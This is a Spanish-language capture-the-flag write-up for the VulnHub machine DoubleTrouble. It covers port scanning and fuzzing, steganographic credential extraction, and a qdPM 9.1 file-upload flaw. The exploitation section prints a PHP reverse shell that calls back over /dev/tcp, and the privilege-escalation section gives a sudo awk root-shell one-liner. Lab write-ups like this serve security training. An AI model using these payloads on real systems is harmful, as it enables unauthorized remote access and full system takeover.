---
title: DoubleTrouble
date: 2024-07-20
categories: [WRITEUPS, VulnHub]
tags: [stegseek, metadatos]  # TAG names should always be lowercase
---

En este ***Writeup*** se engloban las siguientes fases:
- **[Reconocimiento](#reconocimiento)**
- **[Explotación](#explotación)**
- **[Escalada de privilegios](#escalada-de-privilegios)**

---

## **Reconocimiento**

Lo primero que realizaremos será un escaneo de puertos con *NMAP*, para comprobar cuales de ellos están abiertos.

```bash
nmap -p- --open -T5 192.168.1.152 -n -Pn -v
```

![picture](/assets/images/vulnhub/double1.png){: w="600" h="300" }

Al no encontrar ningún puerto que nos interese para utilizar los scripts de *NMAP*, nos iremos a la página web para ver de que se trata.

Tenemos un panel de autenticación de qdPM 9.1, pero no encuentro nada interesante.

![picture](/assets/images/vulnhub/double2.png)

Realizando **Fuzzing** con **Gobuster**, encuentro las siguientes entradas.

```bash
gobuster dir -u http://192.168.1.152/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .txt,.php,.html,.sh,.png,.jpg,.jpeg -b 404,403
```

![picture](/assets/images/vulnhub/double3.png)

En la ruta ***/secret/*** encontramos la siguiente imagen.

![picture](/assets/images/vulnhub/double4.png){: w="600" h="300" }

Nos la vamos a descargar para ver si hubiera **metadatos**.

```bash
wget http://192.168.1.152/secret/doubletrouble.jpg
```

Con la herramienta ***stegseek***, que podemos encontrar en [**GitHub**](https://github.com/RickdeJager/stegseek), extraemos los **metadatos**.

![picture](/assets/images/vulnhub/double5.png)

Nos encuentra la *passphrase*, y otro archivo cuyo nombre original es "**creeds.txt**", y actualmente llamado "**doubletrouble.jpg.out**", el cual contiene credenciales.

![picture](/assets/images/vulnhub/double6.png)

---

## **Explotación**

A continuación, probaremos en el panel de autenticación con las credenciales encontradas en los metadatos de la imagen. 

Y obtenemos acceso dentro de la plataforma de **qdPM**.

![picture](/assets/images/vulnhub/double7.png)

Buscando en internet, encuentro una *vulnerabilidad* para esta versión, la cual podremos subir archivos **PHP** en la foto de los detalles de la cuenta.

Lo siguiente, será subir una **Reverse Shell**.

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/'Nuestra IP'/4444 0>&1'");
?>
```

![picture](/assets/images/vulnhub/double8.png)

Al subirlo nos saldrá un error, pero aun así se habrá subido correctamente.

![picture](/assets/images/vulnhub/double9.png)

Nos ponemos en escucha con **Ncat** con un **Listener**.

```bash
nc -nlvp 4444
```

Y nos dirigimos a la ruta de los archivos subidos de los usuarios, clicamos en la **Reverse Shell** para que se ejecute.

![picture](/assets/images/vulnhub/double10.png){: w="500" h="200" }

Y estaremos dentro del servidor como el usuario **www-data**.

![picture](/assets/images/vulnhub/double11.png)

---

## **Escalada de privilegios**

Buscando por el servidor, no encontramos ningún usuario más allá de **www-data** y **root**, ni nada interesante.

Listando los permisos de **SUDO** del usuario **www-data**, vemos que no necesita contraseña para el binario ***awk***.

![picture](/assets/images/vulnhub/double12.png)

En la web [**GTFOBins - awk**](https://gtfobins.github.io/gtfobins/awk/), nos muestra como escalar privilegios.

Ejecutamos el siguiente comando, y nos migrará al usuario **root**.

```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

![picture](/assets/images/vulnhub/double13.png)